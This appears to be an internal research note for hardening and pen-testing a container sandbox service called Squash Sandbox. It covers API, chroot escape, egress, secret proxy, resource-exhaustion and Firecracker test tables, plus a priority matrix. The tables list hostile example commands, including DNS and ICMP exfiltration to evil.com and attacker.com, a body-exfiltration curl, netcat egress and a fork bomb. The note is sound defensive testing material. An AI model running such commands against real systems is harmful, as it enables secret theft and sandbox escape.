---
date: 2026-02-13T21:19:00Z
researcher: reuben
git_commit: faf9bf9c0df80b50976d9b4c83ea0ca5f7021378
branch: main
repository: sq-sandbox
topic: "How to harden and pen test Squash Sandbox"
tags: [research, codebase, security, pentest, hardening, sandbox-escape, egress, secrets]
status: complete
last_updated: 2026-02-13
last_updated_by: reuben
---

# Research: Hardening & Pen Testing Squash Sandbox

**Date**: 2026-02-13T21:19:00Z
**Git Commit**: faf9bf9
**Branch**: main
**Repository**: sq-sandbox

## Research Question

How would we harden and pen test this system?

## Summary

Squash Sandbox has already gone through a round of security hardening. Input validation, command injection prevention, eval elimination, proper network namespace isolation, cgroup enforcement, secret proxy injection, and integration tests all exist in the current codebase. The remaining attack surface falls into five categories: (1) sandbox escape via kernel primitives not fully locked down, (2) network egress bypass via DNS/ICMP tunneling, (3) secret exfiltration via HTTPS (proxy is HTTP-only), (4) API-level attacks against the unauthenticated-by-default HTTP server, and (5) resource exhaustion from unbounded sandbox/exec counts.

Below is a pen test playbook organized by attack surface, plus concrete hardening recommendations ranked by impact.

---

## Current Security Posture

What's already implemented, with code references:

| Control | Implementation | Location |
|---------|---------------|----------|
| Input validation (IDs, labels, modules) | Character-class whitelist: `[a-zA-Z0-9_-]` | `common.sh:15-25` |
| Command injection prevention | Positional args to inner shell: `_ "$workdir" "$cmd"` | `common.sh:505` |
| eval elimination | Removed from sq-s3 and sq-secret-proxy; sq-ctl accepted risk | `sq-s3`, `sq-secret-proxy`, `sq-ctl:13` |
| Network namespace per sandbox | `ip netns add` + veth pair + iptables chain | `common.sh:282-361` |
| Egress filtering | Per-sandbox iptables chain with host whitelist, default DROP | `common.sh:327-361` |
| Secret proxy | Placeholder substitution, host-scoped, `curl -K` config file | `sq-secret-proxy:22-126` |
| Secret env injection | `_inject_secret_placeholders()` writes `/etc/profile.d/squash-secrets.sh` | `common.sh:252-278` |
| cgroups v2 | `cpu.max` and `memory.max` per sandbox | `common.sh:227-248` |
| Lifetime reaper | Background loop every 10s, destroys expired sandboxes | `sq-reaper:9-30` |
| Bearer token auth | Optional `SQUASH_AUTH_TOKEN` comparison | `common.sh:119-125` |
| Content-Type validation | `require_json()` on all POST endpoints | `common.sh:112-117` |
| Integration tests | Input validation, fs isolation, cgroups, netns, secret proxy, reaper | `sq-test:1-193` |
| Firecracker CID allocation | flock-based monotonic counter | `sq-firecracker:14-23` |

---

## Pen Test Playbook

### Layer 1: API Security

**Attack surface**: busybox httpd serving CGI scripts over HTTP, optionally with bearer token auth.

| Test | Method | Expected Result |
|------|--------|-----------------|
| Auth bypass: empty token | `curl -X GET /cgi-bin/api/sandboxes` (no header) when `SQUASH_AUTH_TOKEN` is set | 401 |
| Auth bypass: partial token | `Authorization: Bearer ${TOKEN:0:5}...` | 401 |
| ID injection: path traversal | `POST /cgi-bin/api/sandboxes -d '{"id":"../../etc"}'` | 400 (validated) |
| ID injection: null bytes | `POST ... -d '{"id":"test\u0000evil"}'` | 400 or safe handling |
| ID injection: very long string | 1000-char alphanumeric ID | Should succeed or fail gracefully, not crash |
| Method confusion | `PUT /cgi-bin/api/sandboxes/dev/exec` | 400 "POST only" |
| Content-Length mismatch | Send `Content-Length: 999` with 10 bytes of body | `dd bs=1 count=999` hangs or times out |
| Concurrent create+destroy | Race: `POST create id=X` and `DELETE id=X` simultaneously | No crash, no orphaned mounts |
| Static file exposure | `GET /static/` — check what's served | Should contain nothing sensitive |
| CGI header injection | Inject `\r\n` in JSON values to split HTTP headers | jq output should be safe (jq encodes special chars) |

**Hardening opportunities**:
- Rate limiting (not currently implemented; busybox httpd doesn't support it)
- HTTPS (requires lighttpd or nginx in front; busybox httpd is HTTP-only)
- Constant-time token comparison (current `[ "Bearer $token" = "$header" ]` is timing-vulnerable, but exploitability is low through CGI)

### Layer 2: Sandbox Escape (Chroot Mode)

**Attack surface**: sandbox code runs inside `ip netns exec ... unshare --mount --pid --fork --map-root-user chroot merged/ /bin/sh`.

| Test | From Inside Sandbox | Expected Result |
|------|---------------------|-----------------|
| Read host filesystem | `ls /proc/1/root/` | Should show sandbox's own root, not host |
| Mount attack | `mount -t proc proc /proc` | Should fail (no CAP_SYS_ADMIN in user namespace) |
| Escape chroot | `mkdir /tmp/x && pivot_root /tmp/x /tmp/x` | Should fail |
| See other sandboxes | `ls /data/sandboxes/` | Path shouldn't exist in sandbox |
| ptrace another process | `strace -p 1` | Should fail (PID 1 is in sandbox's PID namespace) |
| Access `/proc/kcore` | `cat /proc/kcore` | Shouldn't exist or should be empty in sandbox |
| Kernel module load | `insmod /tmp/evil.ko` | Should fail |
| Reboot/shutdown | `reboot` or `echo b > /proc/sysrq-trigger` | Should fail or affect only sandbox |
| IPC with host | `ipcs` or create shared memory | No `--ipc` namespace, but chroot limits access |
| Hostname manipulation | `hostname evil` | No `--uts` namespace, may succeed but harmless |

**Key concern**: `--map-root-user` inside a `--privileged` Docker container. The effective isolation depends on whether the outer container has user namespace remapping enabled. In a standard `--privileged` container, `--map-root-user` maps sandbox UID 0 to the container's UID 0, which IS host UID 0. This means capability-based restrictions may not work as expected.

**Hardening opportunities**:
- Add `--ipc` and `--uts` to the `unshare` call (low effort, closes IPC/hostname leaks)
- Drop capabilities with `capsh` or `unshare --keep-caps` (moderate effort)
- Add a seccomp filter via `--seccomp-filter` or a BPF program (significant effort, highest impact)
- Consider running the container with `--userns-remap` so the privileged container's root isn't host root

### Layer 3: Network Egress Bypass

**Attack surface**: sandboxes with `allow_net` get a netns with iptables egress filtering. Sandboxes without `allow_net` have unrestricted egress (no netns created).

| Test | Method | Expected Result |
|------|--------|-----------------|
| DNS tunneling | `dig @8.8.8.8 $(echo secret \| base64).evil.com` | Succeeds (DNS port 53 always open) |
| ICMP tunneling | `ping -c1 -p $(echo secret \| xxd -p) attacker.com` | May succeed (iptables rules don't filter ICMP) |
| Direct IP access | `curl http://1.2.3.4/` (not in allow_net) | Should be blocked by iptables DROP |
| DNS rebinding | Resolve allowed hostname → attacker IP | First request allowed (IP was in allow_net), subsequent requests to rebound IP may also be allowed since rules are IP-based and set at creation time |
| Post-creation DNS change | Allowed host changes IP after sandbox creation | New IP not in iptables rules → traffic blocked (actually a false negative) |
| UDP egress | `nc -u attacker.com 9999` | Only DNS (53) is explicitly allowed; other UDP should be dropped |
| Default allow_net | Create sandbox without `allow_net` field | Full unrestricted egress (no netns created at all) |

**Hardening opportunities**:
- Filter ICMP in egress rules: `iptables -A "$chain" -p icmp -j DROP`
- Rate-limit DNS to prevent tunneling: `iptables -A "$chain" -p udp --dport 53 -m limit --limit 10/s -j ACCEPT`
- Always create a netns even when `allow_net` is empty (default-deny networking)
- Periodic DNS re-resolution to update iptables rules for allowed hosts

### Layer 4: Secret Exfiltration

**Attack surface**: sq-secret-proxy is HTTP-only, listening on port 8888. Placeholders are injected into `/etc/profile.d/squash-secrets.sh`.

| Test | Method | Expected Result |
|------|--------|-----------------|
| Read placeholder values | `cat /etc/profile.d/squash-secrets.sh` | Shows placeholders (by design, not real secrets) |
| Use placeholder to allowed host | `curl -H "Authorization: Bearer sk-placeholder-anthropic" http://api.anthropic.com/...` via proxy | Placeholder replaced with real key, request succeeds |
| Use placeholder to disallowed host | `curl -H "Authorization: Bearer sk-placeholder-anthropic" http://evil.com/` via proxy | Replacement blocked, request sent with placeholder (or blocked by egress rules) |
| HTTPS bypass | `curl https://evil.com/` with placeholder in header | Bypasses proxy entirely (CONNECT not supported) |
| Exfiltrate via body | `curl -d "key=sk-placeholder-anthropic" http://evil.com/` via proxy | Proxy only scans headers, not body — placeholder sent as-is |
| Direct proxy access | `curl http://10.200.X.1:8888/` (gateway IP) | Proxy accepts connections from sandbox network |
| sed injection in placeholder | Set placeholder to contain `\|` or other sed metacharacters | `sed "s\|$placeholder\|$real\|g"` could break if placeholder has pipe chars |

**Hardening opportunities**:
- HTTPS CONNECT support (requires compiled proxy — Go/Rust, ~200 lines as noted in `sq-secret-proxy:7-8`)
- Scan request bodies for placeholder values too (not just headers)
- Validate placeholder values don't contain sed metacharacters (or use a different replacement method)
- Log all proxy requests for audit trail

### Layer 5: Resource Exhaustion

**Attack surface**: no limit on sandbox count, exec count, or upper layer disk usage.

| Test | Method | Expected Result |
|------|--------|-----------------|
| Fork bomb | `exec ... ':(){ :\|: & };:'` | Should be contained by PID namespace + cgroup |
| Memory bomb | `exec ... 'dd if=/dev/zero of=/dev/null bs=1G count=10'` or `python3 -c '[0]*10**9'` | OOM-killed by cgroup `memory.max` |
| CPU bomb | `exec ... 'while true; do :; done'` | Throttled by cgroup `cpu.max` |
| Fill upper layer | `exec ... 'dd if=/dev/zero of=/tmp/fill bs=1M count=10000'` | No disk quota — fills host tmpfs |
| Create 1000 sandboxes | Loop: `POST /cgi-bin/api/sandboxes` | No limit — consumes loop devices, mount points, cgroups |
| Concurrent execs | 100 parallel `POST .../exec` to same sandbox | CGI forks per request — unbounded |
| iptables exhaustion | Create many sandboxes with `allow_net` | Each sandbox creates iptables chains, veth pairs, IP addresses |
| Subnet collision | Create >254 sandboxes | `cksum % 254 + 1` can produce collisions, overlapping 10.200.X.0/30 subnets |

**Hardening opportunities**:
- Set a max sandbox count (e.g., check count before create)
- Add tmpfs size limit to upper layer: `mount -t tmpfs -o size=512M tmpfs upper/`
- Limit concurrent execs per sandbox (flock or semaphore)
- Use sequential index for subnet allocation instead of hash-based (`cksum % 254`)

### Layer 6: Firecracker-Specific

| Test | Method | Expected Result |
|------|--------|-----------------|
| vsock command injection | Connect to vsock port 5000, send malformed JSON | `jq -er` should reject, handler returns error |
| Unauthorized vsock access | From host or another VM, connect to a sandbox's CID:5000 | vsock CIDs are per-VM; need to know CID to connect |
| VM escape | Kernel exploit from within guest | Firecracker VMM is the boundary; much harder than chroot escape |
| Tap interface manipulation | From host, inject packets into tap device | Possible but requires host access (already compromised) |
| Long sandbox ID | `id="a"*256` → `sq-${id}-tap` exceeds 15-char Linux interface name limit | Interface creation fails; sandbox create should fail gracefully |

---

## Hardening Priority Matrix

Ranked by impact * feasibility:

| Priority | Hardening | Effort | Impact | Notes |
|----------|-----------|--------|--------|-------|
| **P0** | Always create netns (even without `allow_net`) | Small | High | Default-deny networking prevents unrestricted egress. Currently sandboxes without `allow_net` have no network isolation at all |
| **P0** | Add tmpfs size limit to upper layer | One line | High | `mount -t tmpfs -o size=${upper_limit}M` prevents disk-fill DoS |
| **P1** | Add `--ipc --uts` to unshare call | One line | Medium | Closes IPC and hostname leak vectors |
| **P1** | Filter ICMP in egress rules | One line | Medium | Closes ICMP tunneling |
| **P1** | Rate-limit DNS in egress rules | One line | Medium | Mitigates DNS tunneling |
| **P1** | Max sandbox count | Small | Medium | Prevents resource exhaustion from unbounded sandbox creation |
| **P1** | Subnet allocation: sequential index | Small | Medium | `cksum % 254` can collide; use flock+counter like CID allocation |
| **P2** | Seccomp filter | Moderate | High | Blocks kernel exploit surface from within chroot; significant effort but highest security impact |
| **P2** | HTTPS CONNECT proxy | Moderate | High | Compiled Go/Rust binary (~200 lines) to support TLS CONNECT tunneling |
| **P2** | Scan request body for placeholders | Small | Medium | Prevents placeholder exfiltration via POST body |
| **P3** | HTTPS for API (lighttpd/nginx) | Moderate | Medium | Prevents credential sniffing on network |
| **P3** | Constant-time token comparison | Small | Low | Timing attack is impractical through CGI but good hygiene |
| **P3** | Rate limiting | Moderate | Medium | Requires reverse proxy (busybox httpd doesn't support it) |

---

## How to Run a Pen Test

### Prerequisites

```sh
# Build and run privileged container
docker build -t sq-sandbox .
docker run --rm --privileged -p 8080:8080 sq-sandbox

# In another terminal, set up test secrets
docker exec -i <container> sh -c 'cat > /data/secrets.json' <<'EOF'
{
  "secrets": {
    "TEST_KEY": {
      "placeholder": "sk-test-placeholder",
      "value": "sk-real-secret-value",
      "allowed_hosts": ["httpbin.org"]
    }
  }
}
EOF
```

### Test Script Skeleton

```sh
#!/bin/sh
# pentest.sh — run against a live sq-sandbox instance
API="http://localhost:8080"

echo "=== Layer 1: API ==="
# Path traversal
curl -s -o /dev/null -w '%{http_code}' -X POST "$API/cgi-bin/api/sandboxes" \
  -H 'Content-Type: application/json' \
  -d '{"id":"../../etc","layers":"000-base-alpine"}'
# Expected: 400

echo "=== Layer 2: Sandbox Escape ==="
# Create sandbox, try to read host files
curl -s -X POST "$API/cgi-bin/api/sandboxes" \
  -H 'Content-Type: application/json' \
  -d '{"id":"pentest","layers":"000-base-alpine"}'

curl -s -X POST "$API/cgi-bin/api/sandboxes/pentest/exec" \
  -H 'Content-Type: application/json' \
  -d '{"cmd":"ls /data 2>&1 || echo BLOCKED"}'
# Expected: BLOCKED or "No such file"

curl -s -X POST "$API/cgi-bin/api/sandboxes/pentest/exec" \
  -H 'Content-Type: application/json' \
  -d '{"cmd":"cat /proc/1/root/etc/hostname 2>&1 || echo BLOCKED"}'
# Expected: shows sandbox hostname, not host

echo "=== Layer 3: Egress ==="
curl -s -X POST "$API/cgi-bin/api/sandboxes" \
  -H 'Content-Type: application/json' \
  -d '{"id":"pentest-net","layers":"000-base-alpine","allow_net":["httpbin.org"]}'

# Allowed host
curl -s -X POST "$API/cgi-bin/api/sandboxes/pentest-net/exec" \
  -H 'Content-Type: application/json' \
  -d '{"cmd":"wget -qO- http://httpbin.org/ip 2>&1; echo rc=$?"}'
# Expected: succeeds

# Blocked host
curl -s -X POST "$API/cgi-bin/api/sandboxes/pentest-net/exec" \
  -H 'Content-Type: application/json' \
  -d '{"cmd":"wget -qO- http://ifconfig.me/ 2>&1; echo rc=$?","timeout":10}'
# Expected: fails (connection timeout/refused)

echo "=== Cleanup ==="
curl -s -X DELETE "$API/cgi-bin/api/sandboxes/pentest"
curl -s -X DELETE "$API/cgi-bin/api/sandboxes/pentest-net"
```

### Existing Test Coverage

`bin/sq-test` already covers:
- Input validation (path traversal in ID and label, missing Content-Type)
- Filesystem isolation (writes land in upper only)
- cgroups (memory.max and cpu.max values)
- Network egress (netns creation, iptables chain, blocked egress)
- Secret proxy (placeholder env injection, http_proxy set)
- Lifetime reaper (auto-destroy after max_lifetime_s)

What `sq-test` does NOT cover:
- Sandbox escape attempts (mount, ptrace, pivot_root)
- DNS/ICMP tunneling
- Secret exfiltration via HTTPS or request body
- Concurrent request races
- Resource exhaustion (many sandboxes, disk fill)
- Firecracker-specific tests (requires /dev/kvm)

---

## Deviations from Gastropod

The security implementation makes a few deliberate deviations from the Gastropod discipline:

1. **`ip netns exec` + `unshare` + `chroot` pipeline** — this is infrastructure plumbing, not API logic. The complexity is in kernel primitive composition, not framework abstraction. Gastropod's "OS owns I/O" principle is actually *reinforced* — we're using the OS's own isolation primitives.

2. **socat for the secret proxy** — socat is a Unix command (stdin/stdout, no hidden config). It's in the "anything else must behave like a Unix command" category.

3. **Background processes** (reaper, proxy) — launched in entrypoint.sh with `&`. This is standard Unix process management, not framework-level daemons.

None of these violate Gastropod's core invariants. The security layer is OS-native, not framework-native.

## Code References

- `cgi-bin/common.sh:15-25` — Input validation
- `cgi-bin/common.sh:119-125` — Bearer token auth
- `cgi-bin/common.sh:227-248` — cgroup setup
- `cgi-bin/common.sh:252-278` — Secret placeholder injection
- `cgi-bin/common.sh:282-361` — Network namespace + iptables
- `cgi-bin/common.sh:472-533` — Chroot exec (with netns entry)
- `cgi-bin/common.sh:632-672` — Chroot destroy (cleanup)
- `cgi-bin/api/sandboxes:1-119` — REST handler
- `bin/sq-secret-proxy:1-133` — Secret materialization proxy
- `bin/sq-firecracker:1-154` — Firecracker VM management
- `bin/sq-reaper:1-31` — Lifetime enforcement
- `bin/sq-test:1-193` — Integration tests
- `vm/sq-vsock-handler:1-93` — Guest-side vsock handler

## Historical Context

- `thoughts/shared/research/2026-02-13-security-architecture-and-testability.md` — Earlier research on the dual control-plane/runtime architecture and testability
- `thoughts/shared/research/2026-02-13-security-model-comparison.md` — Comparison with Deno Sandbox and NanoClaw
- `thoughts/shared/plans/2026-02-13-security-gap-remediation.md` — Plan that fixed: netns isolation, secret proxy injection, CID allocation, integration tests
- `thoughts/shared/plans/2026-02-13-gastropod-security-hardening.md` — Plan that fixed: input validation, command injection, eval elimination
